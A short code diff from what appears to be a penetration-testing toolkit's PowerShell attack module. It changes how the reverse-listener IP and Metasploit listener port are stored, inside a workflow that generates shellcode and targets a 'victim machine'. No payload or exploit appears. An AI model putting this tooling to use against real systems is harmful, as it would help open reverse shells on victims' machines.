@@ -17,9 +17,7 @@ powershell_menu_choice = raw_input(setprompt(["29"], ""))
 if powershell_menu_choice != "99":
 	# specify ipaddress of reverse listener
 	ipaddr = grab_ipaddress()
-	filewrite = file("src/program_junk/ipaddr.file", "w")
-	filewrite.write(ipaddr)
-	filewrite.close()
+	update_options("IPADDR=" + ipaddr)
 
 	# if we select alphanumeric shellcode
 	if powershell_menu_choice == "1":
@@ -46,17 +44,18 @@ if powershell_menu_choice != "99":
 	    filewrite.write(x86)
 	
 	    # grab port specifications
-	    if os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
-		    fileopen = file("%s/src/program_junk/port.options" % (definepath), "r")
-		    port = fileopen.read()
+	    if check_options("PORT=") != 0:
+			port = check_options("PORT=")
 
-	    if not os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
+	    else:
 		    port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
 		    if port == "": port = "443"
+		    update_options("PORT=" + port)
 
 	    choice = yesno_prompt("0","Do you want to start the listener now [yes/no]: ")
 	    if choice == 'NO':
 	        pass 
+
 	    # if we want to start the listener
 	    if choice == 'YES':
 	        victim = raw_input(setprompt(["29"], "Select x86 or x64 victim machine [default: x64]"))
